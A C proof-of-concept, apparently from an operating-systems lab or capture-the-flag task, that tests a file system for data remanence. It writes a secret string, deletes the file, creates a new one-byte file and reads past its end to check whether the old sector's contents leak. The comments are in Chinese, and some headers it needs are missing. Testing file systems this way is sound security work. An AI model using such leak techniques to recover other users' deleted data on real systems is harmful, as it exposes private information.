#include "stdio.h"
#include "string.h"

char *my_strstr(const char *haystack, const char *needle)
{
    if (!*needle) return (char *)haystack;
    for (; *haystack; haystack++) {
        const char *h = haystack;
        const char *n = needle;
        while (*h && *n && (*h == *n)) {
            h++;
            n++;
        }
        if (!*n) return (char *)haystack;
    }
    return 0;
}

int main(int argc, char *argv[])
{
    char *filename1 = "secret";
    char *filename2 = "dummy";
    char *secret_data = "TOP_SECRET_DATA";
    char buffer[1024];
    int fd;
    int len;
    int i;

    printf("Exploit: Data Remanence (Information Leak)\n");

    /* 1. 创建一个包含机密数据的文件 */
    printf("1. Creating %s with secret data...\n", filename1);
    fd = open(filename1, O_CREAT | O_RDWR);
    if (fd == -1) {
        printf("Error: Failed to create %s\n", filename1);
        return 1;
    }
    write(fd, secret_data, strlen(secret_data));
    close(fd);

    /* 2. 删除该文件 */
    printf("2. Deleting %s...\n", filename1);
    if (unlink(filename1) != 0) {
        printf("Error: Failed to delete %s\n", filename1);
        return 1;
    }

    /* 3. 创建一个新文件 (应该会复用刚刚释放的扇区) */
    printf("3. Creating %s (should reuse sector)...\n", filename2);
    fd = open(filename2, O_CREAT | O_RDWR);
    if (fd == -1) {
        printf("Error: Failed to create %s\n", filename2);
        return 1;
    }

    /* 
       为了确保扇区被分配，我们写入1个字节。
       该扇区剩余的511个字节可能包含旧数据。
    */
    printf("   Writing 1 byte to %s to allocate sector...\n", filename2);
    write(fd, "A", 1);
    close(fd);

    /* 4. 读取新文件内容 */
    printf("4. Reading from %s...\n", filename2);
    fd = open(filename2, O_RDWR);
    if (fd == -1) {
        printf("Error: Failed to open %s\n", filename2);
        return 1;
    }
    
    /* 我们尝试读取比写入的更多的数据 (1字节) */
    len = read(fd, buffer, 1024);
    if (len > 0) {
        buffer[len] = 0;
    } else {
        buffer[0] = 0;
    }
    close(fd);

    printf("5. Read %d bytes.\n", len);
    if (len > 1) {
        printf("   Dump (offset 1+):\n   ");
        for(i=1; i<len; i++) {
            if(buffer[i] >= 32 && buffer[i] <= 126) printf("%c", buffer[i]);
            else printf(".");
        }
        printf("\n");

        /* 
           由于我们写入了一个字节 'A' 到新文件，它覆盖了扇区的第一个字节。
           原本的 "TOP_SECRET_DATA" 变成了 "AOP_SECRET_DATA"。
           所以我们从 buffer 中搜索 secret_data + 1 ("OP_SECRET_DATA")。
        */
        if (my_strstr(buffer, secret_data + 1)) { 
            printf("\n[SUCCESS] Secret data LEAKED!\n");
        } else {
            printf("\n[FAIL] Secret data not found (might not have reused same sector).\n");
        }
    } else {
        printf("[FAIL] Could not read past end of file (FS might strictly enforce size).\n");
        printf("Note: If FS enforces size, this exploit requires bypassing size check or raw disk access.\n");
        printf("However, based on 'command.md', the file content WAS visible.\n");
    }
    
    /* 清理 */
    unlink(filename2);

    return 0;
}

